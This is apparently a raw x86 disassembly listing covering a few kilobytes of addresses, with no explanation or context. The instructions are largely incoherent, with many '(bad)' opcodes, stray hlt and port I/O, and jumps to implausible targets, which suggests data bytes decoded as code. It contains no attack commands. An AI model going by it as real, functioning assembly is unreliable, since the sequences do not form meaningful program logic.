  4022c5:	add    BYTE PTR [ebx+ebp*4-0x11eb7767],dh
  4022cc:	add    eax,DWORD PTR [eax]
  4022ce:	hlt    
  4022cf:	in     eax,dx
  4022d0:	add    eax,DWORD PTR [eax]
  4022d2:	hlt    
  4022d3:	pop    ebp
  4022d4:	inc    BYTE PTR [edx-0xc]
  4022d7:	loope  0x4022dc
  4022d9:	add    al,0xf4
  4022db:	in     eax,0x3
  4022dd:	add    al,0xf4
  4022df:	in     eax,dx
  4022e0:	add    BYTE PTR [ebx-0xc],al
  4022e3:	add    al,0xed
  4022e5:	add    edi,ecx
  4022e7:	add    al,0xf9
  4022e9:	add    edi,esp
  4022eb:	add    al,0xe9
  4022ed:	add    BYTE PTR [edi],dh
  4022ef:	add    eax,0x4f203e5
  4022f4:	or     DWORD PTR [eax+eax*1],eax
	...
  40230f:	aam    0x4
  402311:	jmp    0xed455a16
  402316:	add    edi,eax
  402318:	add    al,0xd9
  40231a:	add    esp,esp
  40231c:	add    al,0xd9
  40231e:	and    eax,0x3f104b7
  402323:	add    al,0x5
  402325:	leave  
  402326:	add    edx,DWORD PTR [eax*1+0x4b725d9]
  40232d:	icebp  
  40232e:	add    esp,esp
  402330:	add    al,0x69
  402332:	add    esi,DWORD PTR [ebp+eax*1-0x47]
  402336:	and    eax,0x3e104b7
  40233b:	adc    al,0x5
  40233d:	imul   eax,DWORD PTR [ebx],0x261905f4
  402343:	mov    bh,0x4
  402345:	or     DWORD PTR [esp+esi*2],eax
  402348:	add    eax,0xf402eb
  40234d:	stc    
  40234e:	and    eax,0x40904b7
  402353:	test   BYTE PTR ds:0xf4f402eb,0xf8
  40235a:	and    eax,0x3e904b7
  40235f:	hlt    
  402360:	add    al,0xe9
  402362:	add    esi,esp
  402364:	add    al,0x89
  402366:	or     ah,dh
  402368:	add    al,0xe9
  40236a:	or     eax,DWORD PTR [ebp+eax*1-0x17]
  40236e:	or     esp,esp
  402370:	add    al,0xd5
  402372:	or     eax,DWORD PTR [eax]
	...
  40238c:	inc    edi
  40238d:	add    eax,0xfbecdb00
  402392:	(bad)  
  402393:	call   0xe9407887
  402398:	call   DWORD PTR [eax+eax*1]
  40239b:	jmp    0xf940e898
  4023a0:	cli    
  4023a1:	push   cs
  4023a2:	add    cl,ch
  4023a4:	out    dx,eax
  4023a5:	fs add cl,ch
  4023a8:	jmp    DWORD PTR [eax+eax*1]
  4023ab:	jmp    0xe940c8a8
  4023b0:	out    dx,eax
  4023b1:	add    al,0x0
  4023b3:	jmp    0xe940a8a7
  4023b8:	inc    DWORD PTR [eax+eax*1-0x17]
  4023bc:	clc    
  4023bd:	in     al,0x0
  4023bf:	stc    
  4023c0:	cli    
  4023c1:	add    al,BYTE PTR [eax]
  4023c3:	jmp    0xe94060b7
  4023c8:	(bad)  
  4023c9:	cld    
  4023ca:	(bad)  
  4023cb:	call   0xda4098c8
  4023d0:	cli    
  4023d1:	pop    ds
  4023d2:	add    cl,ch
  4023d4:	out    dx,eax
  4023d5:	pop    esp
  4023d6:	add    cl,ch
  4023d8:	call   FWORD PTR [eax+eax*1]
  4023db:	jmp    0xf840d8d8
  4023e0:	cli    
  4023e1:	cmc    
  4023e2:	(bad)  
  4023e3:	call   0xe94090d7
  4023e8:	jmp    FWORD PTR [eax+eax*1]
  4023eb:	jmp    0xe940b8e8
	...
  402408:	add    bh,ch
  40240a:	or     al,0x0
  40240c:	jmp    0xe940b100
  402411:	dec    DWORD PTR [eax+eax*1-0x17]
  402415:	clc    
  402416:	aam    0x0
  402418:	stc    
  402419:	cli    
  40241a:	add    BYTE PTR [eax],al
  40241c:	jmp    0x405510
  402421:	fisttp QWORD PTR [esi]
  402423:	adc    al,0x0
  402425:	mov    al,ds:0x9e00e30e
  40242a:	add    ebp,DWORD PTR [ebx]
  40242c:	add    ch,cl
  40242e:	push   cs
  40242f:	je     0x402431
  402431:	popf   
  402432:	push   cs
  402433:	xor    al,0x0
  402435:	popf   
  402436:	or     eax,ecx
  402438:	add    BYTE PTR [ebx+eax*1+0xe8d000d],bl
  40243f:	add    BYTE PTR fs:[ebp-0x62ffdbf2],bl
  402446:	or     DWORD PTR [eax+0x40e8d00],ebp
  40244c:	add    BYTE PTR [ebp+0x5d00840e],cl
  402452:	push   cs
  402453:	inc    esp
  402454:	add    BYTE PTR [ebp+0x9],bl
  402457:	call   0x843815c
  40245c:	add    BYTE PTR [ebp+0xe],cl
  40245f:	pop    esp
  402460:	add    BYTE PTR [ebp+0xe],bl
  402463:	sbb    al,0x0
  402465:	pop    ebp
  402466:	or     DWORD PTR [eax+0x53032100],ebx
	...
  402484:	add    BYTE PTR [eax],al
  402486:	dec    ebp
  402487:	push   cs
  402488:	jl     0x40248a
  40248a:	sbb    eax,0x1d003c0e
  40248f:	or     eax,ebx
  402491:	add    BYTE PTR [edi],bl
  402493:	add    edx,DWORD PTR [edi]
  402495:	add    BYTE PTR ds:0x1d006c0e,cl
  40249b:	push   cs
  40249c:	sub    al,0x0
  40249e:	sbb    eax,0xd00b809
  4024a3:	push   cs
  4024a4:	or     al,0x0
  4024a6:	or     eax,0xdd008c0e
  4024ab:	or     eax,0x8dd004c
  4024b0:	clc    
  4024b1:	add    ah,dh
  4024b3:	fild   DWORD PTR [esi]
  4024b5:	add    esi,esp
  4024b7:	jmp    0x4024c4
  4024b9:	push   edx
  4024ba:	hlt    
  4024bb:	jmp    0x4024c8
  4024bd:	adc    dh,ah
  4024bf:	mov    al,0xb
  4024c1:	mov    ds:0x2306bef4,eax
  4024c6:	hlt    
  4024c7:	jmp    0x4024d4
  4024c9:	jb     0x4024bf
  4024cb:	jmp    0x4024d8
  4024cd:	xor    dh,ah
  4024cf:	jmp    0x4024db
  4024d1:	(bad)  
  4024d2:	hlt    
  4024d3:	fadd   QWORD PTR [ebx+ecx*1]
  4024d6:	hlt    
  4024d7:	jmp    0x4024e4
  4024d9:	(bad)  
  4024da:	hlt    
  4024db:	jmp    0x4024e8
  4024dd:	and    dh,ah
  4024df:	jmp    0x4024eb
  4024e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024e2:	hlt    
  4024e3:	jmp    0x4024f0
  4024e5:	add    dh,ah
  4024e7:	jmp    0x4024f4
  4024e9:	add    BYTE PTR [eax],0x0
	...
  402500:	add    BYTE PTR [eax],al
  402502:	add    ah,dh
  402504:	jmp    0x402511
  402506:	inc    edx
  402507:	hlt    
  402508:	jmp    0x402514
  40250a:	in     al,0xf4
  40250c:	fild   DWORD PTR [edi+eax*1]
  40250f:	hlt    
  402510:	jmp    0x40251d
  402512:	pop    edx
  402513:	hlt    
  402514:	jmp    0x402521
  402516:	sbb    dh,ah
  402518:	jmp    0x402524
  40251a:	xchg   esp,eax
  40251b:	hlt    
  40251c:	mov    bh,0x4
  40251e:	inc    ebx
  40251f:	hlt    
  402520:	jmp    0x40252d
  402522:	jp     0x402518
  402524:	jmp    0x402531
  402526:	cmp    dh,ah
  402528:	jmp    0x402534
  40252a:	aam    0xf4
  40252c:	fld    QWORD PTR [ebx+edx*1]
  40252f:	hlt    
  402530:	jmp    0x40253d
  402532:	push   0xfffffff4
  402534:	jmp    0x402541
  402536:	sub    dh,ah
  402538:	jmp    0x402544
  40253a:	mov    ah,0xf4
  40253c:	jmp    0x402549
  40253e:	or     dh,ah
  402540:	jmp    0x40254d
  402542:	mov    dh,ah
  402544:	add    al,0xe9
  402546:	or     edi,DWORD PTR [esi]
  402548:	add    eax,0x5e80ae9
  40254d:	stc    
  40254e:	add    al,0xf1
  402550:	add    al,0xe9
  402552:	or     ebp,DWORD PTR [edx]
  402554:	add    eax,0x4e20be9
  402559:	test   eax,0xda04f40b
  40255e:	add    al,0x7
  402560:	add    eax,0x52a0be9
  402565:	jmp    0x402575
	...
  40257e:	add    BYTE PTR [eax],al
  402580:	loop   0x402586
  402582:	jmp    0xf845d591
  402587:	add    al,0xeb
  402589:	add    al,0xe9
  40258b:	or     ebx,DWORD PTR [edx]
  40258d:	add    eax,0x4d20be9
  402592:	jmp    0xe94575a1
  402597:	or     esi,edx
  402599:	add    al,0xe9
  40259b:	or     edi,DWORD PTR [edx+0x5]
  40259e:	jmp    0xe944d7ae
  4025a3:	or     dl,BYTE PTR [eax+0x5]
  4025a6:	stc    
  4025a7:	add    al,0xed
  4025a9:	add    al,0xe9
  4025ab:	or     esi,DWORD PTR [edx-0x15f416fc]
  4025b1:	add    al,0xe9
  4025b3:	or     ah,BYTE PTR [eax+0x5]
  4025b6:	fld    QWORD PTR [edi+edx*8]
  4025b9:	add    al,0xe9
  4025bb:	or     esi,DWORD PTR [edx-0x15f416fc]
  4025c1:	add    al,0xe9
  4025c3:	or     al,BYTE PTR [eax+0x5]
  4025c6:	sti    
  4025c7:	add    al,0xff
  4025c9:	add    al,0xe9
  4025cb:	or     esp,DWORD PTR [edx-0x25f416fc]
  4025d1:	add    al,0xe9
  4025d3:	or     al,BYTE PTR [eax+0x5]
  4025d6:	add    cl,ch
  4025d8:	out    dx,eax
  4025d9:	push   es
  4025da:	add    cl,ch
  4025dc:	inc    DWORD PTR [esi+0x46ffe900]
  4025e2:	add    cl,ch
	...
  4025fc:	add    dh,ch
  4025fe:	fadd   DWORD PTR [eax]
  402600:	mov    eax,esi
  402602:	add    al,0x0
  402604:	jmp    0xe9405c08
  402609:	push   ebp
  40260b:	call   ebx
  40260d:	out    dx,eax
  40260e:	add    DWORD PTR [eax],0xffffffdb
  402611:	lock idiv edi
  402614:	call   0xe9407c18
  402619:	call   DWORD PTR ds:0xc2f0e900
  40261f:	add    cl,bh
  402621:	test   BYTE PTR [edx],0x0
  402624:	jmp    0xe9408c28
  402629:	jmp    DWORD PTR ds:0xa2f0e900
  40262f:	add    cl,ch
  402631:	out    dx,eax
  402632:	add    eax,0x85ffe900
  402637:	add    cl,ch
  402639:	inc    DWORD PTR [ebp+0x0]
  40263c:	jmp    0xf9410931
  402641:	idiv   dh
  402643:	(bad)  
  402644:	call   0xe9406448
  402649:	(bad)  
  40264a:	std    
  40264b:	(bad)  
  40264c:	call   0xda409941
  402651:	neg    BYTE PTR [ebx]
  402653:	add    cl,ch
  402655:	call   FWORD PTR [ebp+0x0]
  402658:	jmp    0xe940445c
  40265d:	lock mov dl,0x0
  402660:	clc    
	...
  402679:	add    dh,dh
  40267b:	cmc    
  40267c:	(bad)  
  40267d:	call   0x409481
  402682:	sbb    eax,0xd00290b
  402687:	or     BYTE PTR [edx+0x90b0d00],dh
  40268d:	add    ch,bl
  40268f:	or     cl,BYTE PTR [ecx+0x490add00]
  402695:	add    ch,cl
  402697:	or     edx,esi
  402699:	add    ch,bl
  40269b:	add    eax,DWORD PTR [eax+eax*1]
  40269e:	fisttp QWORD PTR [edx]
  4026a0:	push   ebp
  4026a1:	add    ch,bl
  4026a3:	or     dl,BYTE PTR ds:0x20a9d00
  4026a9:	add    DWORD PTR [esi-0x62ffd4fd],ebx
  4026af:	or     dh,BYTE PTR [ebp+0x0]
  4026b2:	popf   
  4026b3:	or     dh,BYTE PTR ds:0xca098d00
  4026b9:	add    BYTE PTR [ebx+eax*1+0xa9d000d],bl
  4026c0:	add    BYTE PTR gs:[ebp-0x72ffdaf6],bl
  4026c7:	or     DWORD PTR [edx+0x50a8d00],ebp
  4026cd:	add    BYTE PTR [ebp+0xa],bl
  4026d0:	test   DWORD PTR [eax],eax
  4026d2:	pop    ebp
  4026d3:	or     al,BYTE PTR [ebp+0x0]
  4026d6:	dec    ebp
  4026d7:	or     edx,ebp
  4026d9:	add    BYTE PTR [ebp+0x3],bl
  4026dc:	or     BYTE PTR [eax],al
	...
  4026f6:	add    BYTE PTR [ebp+0xa],bl
  4026f9:	pop    ebp
  4026fa:	add    BYTE PTR [ebp+0xa],bl
  4026fd:	sbb    eax,0x9a094d00
  402702:	add    BYTE PTR [ecx],bl
  402704:	add    edx,DWORD PTR [ebx+0x0]
  402707:	sbb    eax,0x1d007d0a
  40270c:	or     bh,BYTE PTR ds:0xda090d00
  402712:	add    ah,dh
  402714:	fld    DWORD PTR [edx]
  402716:	pop    ss
  402717:	hlt    
  402718:	jmp    0x402725
  40271a:	ins    DWORD PTR es:[edi],dx
  40271b:	hlt    
  40271c:	jmp    0x402729
  40271e:	sub    eax,0xba0cebf4
  402723:	hlt    
  402724:	jmp    0x402731
  402726:	or     eax,0x8d0bebf4
  40272b:	hlt    
  40272c:	jmp    0x402739
  40272e:	dec    ebp
  40272f:	hlt    
  402730:	jmp    0x40273e
  402732:	cli    
  402733:	hlt    
  402734:	fild   DWORD PTR [edx]
  402736:	add    esi,esp
  402738:	jmp    0x402745
  40273a:	push   ebx
  40273b:	hlt    
  40273c:	jmp    0x402749
  40273e:	adc    esi,esp
  402740:	mov    al,0xb
  402742:	ret    
  402743:	hlt    
  402744:	mov    edx,0xebf42302
  402749:	or     esi,DWORD PTR [ebx-0xc]
  40274c:	jmp    0x402759
  40274e:	xor    esi,esp
  402750:	jmp    0x40275c
  402752:	(bad)  
  402753:	hlt    
  402754:	fadd   QWORD PTR [eax]
  402756:	or     esi,esp
  402758:	jmp    0x402765
  40275a:	arpl   WORD PTR [eax],ax
	...
  402774:	hlt    
  402775:	jmp    0x402782
  402777:	and    esi,esp
  402779:	jmp    0x402785
  40277b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40277c:	hlt    
  40277d:	jmp    0x40278a
  40277f:	add    esi,esp
  402781:	jmp    0x40278e
  402783:	xor    esp,0xffffffeb
  402786:	or     eax,DWORD PTR [ebx-0xc]
  402789:	jmp    0x402795
  40278b:	out    0xf4,al
  40278d:	fild   DWORD PTR [eax]
  40278f:	pop    es
  402790:	hlt    
  402791:	jmp    0x40279e
  402793:	pop    ebx
  402794:	hlt    
  402795:	jmp    0x4027a2
  402797:	sbb    esi,esp
  402799:	jmp    0x4027a5
  40279b:	xchg   esi,eax
  40279c:	hlt    
  40279d:	mov    bh,0x0
  40279f:	inc    ebx
  4027a0:	hlt    
  4027a1:	jmp    0x4027ae
  4027a3:	jnp    0x402799
  4027a5:	add    al,0xe9
  4027a7:	or     ebx,edi
  4027a9:	add    al,0xe9
  4027ab:	or     al,BYTE PTR [edx+0x4]
  4027ae:	sti    
  4027af:	add    bh,ah
  4027b1:	add    al,0xe9
  4027b3:	or     ebx,DWORD PTR [edi-0x30f416fc]
  4027b9:	add    al,0xe9
  4027bb:	or     al,BYTE PTR [edx+0x4]
  4027be:	jmp    0xe94526ce
  4027c3:	or     edi,DWORD PTR [edi+0x5]
  4027c6:	jmp    0xe94556d6
  4027cb:	or     ah,dl
  4027cd:	add    eax,0x4f900f9
  4027d2:	jmp    0xe9454ae2
  4027d7:	or     eax,DWORD PTR [eax]
	...
  4027f1:	jmp    0x4027f7
  4027f3:	test   eax,0xda04f40b
  4027f8:	add    bh,ah
  4027fa:	add    al,0xe9
  4027fc:	or     esp,DWORD PTR [ebx]
  4027fe:	add    eax,0x4eb0be9
  402803:	jmp    0xf845d212
  402808:	add    BYTE PTR [ebx],al
  40280a:	add    eax,0x5130be9
  40280f:	jmp    0xe945031f
  402814:	or     cl,BYTE PTR [edx+0x5]
  402817:	jmp    0xe9452327
  40281c:	or     esi,DWORD PTR [ebx+0x5]
  40281f:	jmp    0xe944e32f
  402824:	or     cl,BYTE PTR [edx+0x5]
  402827:	stc    
  402828:	add    ch,bh
  40282a:	add    al,0xe9
  40282c:	or     ebp,DWORD PTR [ebx-0x1cf416fc]
  402832:	add    al,0xe9
  402834:	or     bl,BYTE PTR [edx+0x5]
  402837:	add    ch,bl
  402839:	hlt    
  40283a:	addr16 add cl,ch
  40283d:	call   DWORD PTR [ebx+0x0]
  402840:	jmp    0xe9403c34
  402845:	out    dx,al
  402846:	mov    dl,0x0
  402848:	sti    
  402849:	hlt    
  40284a:	out    dx,eax
  40284b:	(bad)  
  40284c:	call   0xe9408c50
  402851:	out    dx,eax
  402852:	and    eax,DWORD PTR [eax]
  402854:	jmp    0x402859
	...
  40286d:	add    dh,ch
  40286f:	xchg   edx,eax
  402870:	add    cl,ch
  402872:	inc    DWORD PTR [ebx]
  402874:	add    cl,ch
  402876:	inc    DWORD PTR [ebx+0x43efe900]
  40287c:	add    cl,ch
  40287e:	out    dx,al
  40287f:	rol    BYTE PTR [eax],cl
  402881:	mov    esp,esi
  402883:	add    al,0x0
  402885:	jmp    0xe9405d89
  40288a:	out    dx,eax
  40288b:	hlt    
  40288c:	call   esp
  40288e:	out    dx,eax
  40288f:	push   edi
  402890:	add    bl,bl
  402892:	hlt    
  402893:	repz (bad) 
  402895:	call   0xe9407d99
  40289a:	out    dx,eax
  40289b:	adc    al,0x0
  40289d:	jmp    0xf940ee8a
  4028a2:	xchg   edx,eax
  4028a3:	std    
  4028a4:	(bad)  
  4028a5:	call   0xe9408da9
  4028aa:	out    dx,eax
  4028ab:	and    al,0x0
  4028ad:	jmp    0xe940ce9a
  4028b2:	inc    DWORD PTR [eax+eax*1]
  4028b5:	jmp    0xe940adb9
  4028ba:	out    dx,eax
  4028bb:	inc    esp
  4028bc:	add    cl,ch
  4028be:	call   0x533929a8
  4028c3:	or     DWORD PTR [eax],eax
  4028c5:	jmp    0x4055c9
  4028ca:	dec    ebp
  4028cb:	call   DWORD PTR [edi]
  4028cd:	add    BYTE PTR [ebp+0x0],cl
  4028d0:	xchg   ecx,eax
	...
  4028e9:	add    BYTE PTR [eax],al
  4028eb:	dec    esi
  4028ec:	sar    BYTE PTR [edx],cl
  4028ee:	add    BYTE PTR ds:0xd0077ff,bl
  4028f4:	push   DWORD PTR [edi]
  4028f6:	add    BYTE PTR ds:0xc00d100,cl
  4028fc:	rcl    BYTE PTR [eax],cl
  4028fe:	add    BYTE PTR ds:0xd0067ff,bl
  402904:	jmp    DWORD PTR [edi]
  402906:	add    BYTE PTR ds:0xdd00b100,cl
  40290c:	inc    BYTE PTR [edi]
  40290e:	add    ch,bl
  402910:	inc    BYTE PTR [edi+0x47fecd00]
  402916:	add    ch,cl
  402918:	add    ecx,esi
  40291a:	add    ch,cl
  40291c:	rol    DWORD PTR [ebx],cl
  40291e:	add    ch,bl
  402920:	(bad)  
  402921:	push   ebx
  402922:	add    ch,cl
  402924:	(bad)  
  402925:	adc    eax,DWORD PTR [eax]
  402927:	mov    al,ds:0xce00e2fe
  40292c:	shr    DWORD PTR [edx],cl
  40292e:	add    BYTE PTR [ebp-0x72ff8c02],bl
  402934:	(bad)  
  402935:	xor    eax,DWORD PTR [eax]
  402937:	lea    eax,[ecx]
  402939:	leave  
  40293a:	add    BYTE PTR [ebx+edx*8-0x162fff4],cl
  402941:	arpl   WORD PTR [eax],ax
  402943:	(bad)  
  402944:	(bad)  
  402945:	and    eax,DWORD PTR [eax]
  402947:	lea    eax,[ecx]
  402949:	test   eax,0x3fe5d00
	...
  402966:	add    BYTE PTR [eax],al
  402968:	pop    ebp
  402969:	inc    BYTE PTR [ebx+0x43fe4d00]
  40296f:	add    BYTE PTR [ebp+0x1],cl
  402972:	jmp    0xff0c1d77
  402977:	pop    es
  402978:	hlt    
  402979:	fisttp DWORD PTR [ebx]
  40297b:	pop    esp
  40297c:	hlt    
  40297d:	fisttp DWORD PTR [ebx]
  40297f:	sbb    al,0xf4
  402981:	fisttp DWORD PTR [ecx+ebx*4]
  402984:	hlt    
  402985:	scas   eax,DWORD PTR es:[edi]
  402986:	(bad)  
  402987:	push   edx
  402988:	hlt    
  402989:	fisttp DWORD PTR [ebx]
  40298b:	jl     0x402981
  40298d:	fisttp DWORD PTR [ebx]
  40298f:	cmp    al,0xf4
  402991:	fisttp DWORD PTR [ecx+ebx*8]
  402994:	hlt    
  402995:	int    0xfe
  402997:	push   ss
  402998:	hlt    
  402999:	fisttp DWORD PTR [ebx]
  40299b:	ins    BYTE PTR es:[edi],dx
  40299c:	hlt    
  40299d:	fisttp DWORD PTR [ebx]
  40299f:	sub    al,0xf4
  4029a1:	fisttp DWORD PTR [ecx+edi*4]
  4029a4:	hlt    
  4029a5:	fisttp DWORD PTR [ebx]
  4029a7:	or     al,0xf4
  4029a9:	fisttp DWORD PTR [ebx]
  4029ab:	mov    esp,?
  4029ad:	fisttp DWORD PTR [ebx]
  4029af:	dec    esp
  4029b0:	hlt    
  4029b1:	fisttp DWORD PTR [ecx+edi*8]
  4029b4:	hlt    
  4029b5:	retf   
  4029b6:	inc    BYTE PTR [edx]
  4029b8:	hlt    
  4029b9:	fisttp DWORD PTR [ebx]
  4029bb:	push   edx
  4029bc:	hlt    
  4029bd:	fisttp DWORD PTR [ebx]
  4029bf:	adc    dh,ah
  4029c1:	mov    eax,0xaef4a30b
  4029c6:	(bad)  
  4029c7:	and    dh,ah
  4029c9:	fisttp DWORD PTR [ebx]
  4029cb:	jb     0x4029cd
	...
  4029e5:	hlt    
  4029e6:	fisttp DWORD PTR [ebx]
  4029e8:	xor    dh,ah
  4029ea:	fisttp DWORD PTR [edx]
  4029ec:	(bad)
  4029ef:	cld    
  4029f0:	or     dh,ah
  4029f2:	fisttp DWORD PTR [ebx]
  4029f4:	(bad)  
  4029f5:	hlt    
  4029f6:	fisttp DWORD PTR [ebx]
  4029f8:	and    dh,ah
  4029fa:	fisttp DWORD PTR [edx]
  4029fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029fd:	hlt    
  4029fe:	fisttp DWORD PTR [ebx]
  402a00:	add    dh,ah
  402a02:	fisttp DWORD PTR [ebx]
  402a04:	xor    ah,0x4
  402a07:	jmp    0xe944e017
  402a0c:	or     bl,BYTE PTR [ecx+0x4]
  402a0f:	stc    
  402a10:	cld    
  402a11:	repnz add al,0xe9
  402a14:	or     ebx,DWORD PTR [esi-0x21f416fc]
  402a1a:	add    al,0xe9
  402a1c:	or     cl,BYTE PTR [ecx-0x490322fc]
  402a22:	add    al,0xe9
  402a24:	or     ebx,DWORD PTR [esi-0x21f416fc]
  402a2a:	add    al,0xe9
  402a2c:	or     ch,BYTE PTR [ecx]
  402a2e:	add    al,0xfb
  402a30:	cld    
  402a31:	out    0x4,al
  402a33:	jmp    0xe944b843
  402a38:	or     ecx,esi
  402a3a:	add    al,0xe9
  402a3c:	or     ch,BYTE PTR [ecx-0x1f416fb]
  402a42:	add    al,0xe9
  402a44:	or     ebp,DWORD PTR [esi+0x5]
  402a47:	jmp    0x402a57
	...
  402a60:	add    BYTE PTR [eax],al
  402a62:	cs add eax,0x5c90ae9
  402a68:	stc    
  402a69:	cld    
  402a6a:	lock add al,0xe9
  402a6d:	or     ebp,DWORD PTR [edx]
  402a6f:	add    eax,0x4e20be9
  402a74:	test   eax,0xda04f40b
  402a79:	cld    
  402a7a:	out    0x4,al
  402a7c:	jmp    0xe945548c
  402a81:	or     esp,edx
  402a83:	add    al,0xe9
  402a85:	or     al,cl
  402a87:	add    eax,0x4fafcf8
  402a8c:	jmp    0xe945449c
  402a91:	or     edx,edx
  402a93:	add    al,0xe9
  402a95:	or     ah,BYTE PTR [ecx-0x16fffb]
  402a9b:	push   es
  402a9c:	add    cl,ch
  402a9e:	out    dx,eax
  402a9f:	xchg   BYTE PTR [eax],al
  402aa1:	jmp    0xe9407195
  402aa6:	(bad)  
  402aa7:	loope  0x402aa9
  402aa9:	stc    
  402aaa:	dec    eax
  402aab:	std    
  402aac:	(bad)  
  402aad:	call   0xe94059a1
  402ab2:	out    dx,eax
  402ab3:	out    dx,al
  402ab4:	(bad)  
  402ab5:	call   0xdd409cb8
  402aba:	sub    BYTE PTR [ebx+0x0],ah
  402abd:	jmp    0xe94079b1
  402ac2:	out    dx,eax
  402ac3:	push   cs
  402ac4:	add    cl,ch
	...
  402ade:	add    dh,bh
  402ae0:	mov    cl,0x0
  402ae2:	sti    
  402ae3:	or     bl,ch
  402ae5:	(bad)  
  402ae6:	call   0xe94089da
  402aeb:	out    dx,eax
  402aec:	push   ds
  402aed:	add    cl,ch
  402aef:	(bad)  
  402af0:	xchg   ecx,eax
  402af1:	add    cl,ch
  402af3:	(bad)  
  402af4:	(bad)  
  402af5:	(bad)  
  402af6:	call   0xe940a9ea
  402afb:	out    dx,eax
  402afc:	ds add cl,ch
  402aff:	(bad)  
  402b00:	rol    DWORD PTR [eax],1
  402b02:	mov    eax,ecx
  402b04:	iret   
  402b05:	(bad)  
  402b06:	jmp    0xe94060fa
  402b0b:	out    dx,eax
  402b0c:	cmc    
  402b0d:	call   ebx
  402b0f:	inc    DWORD PTR [ebx-0x11572500]
  402b15:	(bad)  
  402b16:	call   0xe940810a
  402b1b:	lahf   
  402b1c:	adc    al,0x0
  402b1e:	jmp    0xf940edb3
  402b23:	(bad)  
  402b24:	cli    
  402b25:	(bad)  
  402b26:	call   0x408faa
  402b2b:	(bad)  
  402b2c:	retf   
  402b2d:	and    BYTE PTR [eax],al
  402b2f:	pop    ebp
  402b30:	shl    BYTE PTR [edx+0xcb5d00],1
  402b36:	add    BYTE PTR [ebp-0x35],cl
  402b39:	add    BYTE PTR [eax],0x4d
  402b3c:	retf   
  402b3d:	inc    eax
  402b3e:	add    BYTE PTR [ebp-0x30],bl
  402b41:	loop   0x402b43
	...
  402b5b:	add    BYTE PTR [ebp-0x6],cl
  402b5e:	add    eax,0x58cb4d00
  402b63:	add    BYTE PTR [ebp-0x35],cl
  402b66:	sbb    BYTE PTR [eax],al
  402b68:	sbb    eax,0x4e0092d0
  402b6d:	cli    
  402b6e:	cmp    al,BYTE PTR [eax]
  402b70:	or     eax,0xd0078cb
  402b75:	retf   
  402b76:	cmp    BYTE PTR [eax],al
  402b78:	sbb    eax,0xc00d2d0
  402b7d:	cli    
  402b7e:	adc    BYTE PTR [eax],al
  402b80:	or     eax,0xd0068cb
  402b85:	retf   
  402b86:	sub    BYTE PTR [eax],al
  402b88:	fst    st(1)
  402b8a:	mov    dl,0x0
  402b8c:	(bad)  
  402b8e:	or     BYTE PTR [eax],al
  402b90:	int    0xca
  402b92:	mov    BYTE PTR [eax],al
  402b94:	int    0xca
  402b96:	dec    eax
  402b97:	add    ch,bl
  402b99:	shl    edx,1
  402b9b:	add    ch,cl
  402b9d:	sti    
  402b9e:	add    eax,DWORD PTR [eax]
  402ba0:	int    0xca
  402ba2:	push   esp
  402ba3:	add    ch,cl
  402ba5:	retf   0x14
  402ba8:	int    0xca
  402baa:	add    DWORD PTR [ecx],eax
  402bac:	into   
  402bad:	sti    
  402bae:	sub    al,BYTE PTR [eax]
  402bb0:	(bad)  
  402bb1:	retf   0x74
  402bb4:	(bad)  
  402bb5:	retf   0x34
  402bb8:	popf   
  402bb9:	ror    edx,1
  402bbb:	add    ah,dh
  402bbd:	int3   
  402bbe:	or     cl,BYTE PTR ds:0x0
	...
  402bd8:	add    ah,dh
  402bda:	(bad)  
  402bdc:	fs hlt 
  402bde:	(bad)  
  402be0:	and    al,0xf4
  402be2:	(bad)  
  402be4:	stos   BYTE PTR es:[edi],al
  402be5:	hlt    
  402be6:	(bad)  
  402be8:	add    al,0xf4
  402bea:	(bad)  
  402bec:	test   ah,dh
  402bee:	(bad)  
  402bf0:	inc    esp
  402bf1:	hlt    
  402bf2:	(bad)  
  402bf4:	jmp    0xdbf4:0x80acbf4
  402bfb:	sti    
  402bfc:	pop    esp
  402bfd:	hlt    
  402bfe:	(bad)  
  402c00:	sbb    al,0xf4
  402c02:	(bad)  
  402c04:	call   0xdbf4:0x530aaff4
  402c0b:	sti    
  402c0c:	jl     0x402c02
  402c0e:	(bad)  
  402c10:	cmp    al,0xf4
  402c12:	(bad)  
  402c14:	(bad)  
  402c16:	leave  
  402c17:	or     dl,BYTE PTR [edi]
  402c19:	hlt    
  402c1a:	(bad)  
  402c1c:	ins    BYTE PTR es:[edi],dx
  402c1d:	hlt    
  402c1e:	(bad)  
  402c20:	sub    al,0xf4
  402c22:	(bad)  
  402c24:	mov    edx,0xcfbdbf4
  402c29:	hlt    
  402c2a:	(bad)  
  402c2c:	mov    esp,?
  402c2e:	(bad)  
  402c30:	dec    esp
  402c31:	hlt    
  402c32:	(bad)  
  402c34:	cli    
  402c35:	hlt    
  402c36:	retf   
  402c37:	or     al,BYTE PTR [ebx]
  402c39:	hlt    
  402c3a:	(bad)  
  402c3c:	push   edx
	...
  402c55:	add    ah,dh
  402c57:	(bad)  
  402c59:	adc    dh,ah
  402c5b:	mov    eax,0xaaf4c2fb
  402c60:	or     ah,BYTE PTR [ebx]
  402c62:	hlt    
  402c63:	(bad)  
  402c65:	jb     0x402c5b
  402c67:	add    al,0xe9
  402c69:	sti    
  402c6a:	mov    BYTE PTR [ecx+ebp*8],0xfa
  402c6e:	mov    dl,0x4
  402c70:	clc    
  402c71:	or     bh,ch
  402c73:	add    al,0xe9
  402c75:	sti    
  402c76:	push   ss
  402c77:	add    eax,0x516fbe9
  402c7c:	jmp    0xe944bf7b
  402c81:	sti    
  402c82:	test   BYTE PTR [ecx+ebp*8],0xfb
  402c86:	jbe    0x402c8c
  402c88:	jmp    0xe944e388
  402c8d:	cli    
  402c8e:	push   edx
  402c8f:	add    al,0xf9
  402c91:	or     bl,bh
  402c93:	add    al,0xe9
  402c95:	sti    
  402c96:	sahf   
  402c97:	add    al,0xe9
  402c99:	sti    
  402c9a:	push   cs
  402c9b:	add    eax,0x482fae9
  402ca0:	fisttp QWORD PTR [eax]
  402ca2:	mov    bh,0x4
  402ca4:	jmp    0xe944cba4
  402ca9:	sti    
  402caa:	into   
  402cab:	add    al,0xe9
  402cad:	cli    
  402cae:	and    al,BYTE PTR [ebx+edi*8]
  402cb1:	or     bh,ah
  402cb3:	add    al,0xe9
  402cb5:	sti    
  402cb6:	mov    es,WORD PTR [ecx+ebp*8]
  402cb9:	sti    
	...
  402cd2:	add    BYTE PTR [esi],bl
  402cd4:	add    eax,0x5a2fae9
  402cd9:	jmp    0xe9451bd9
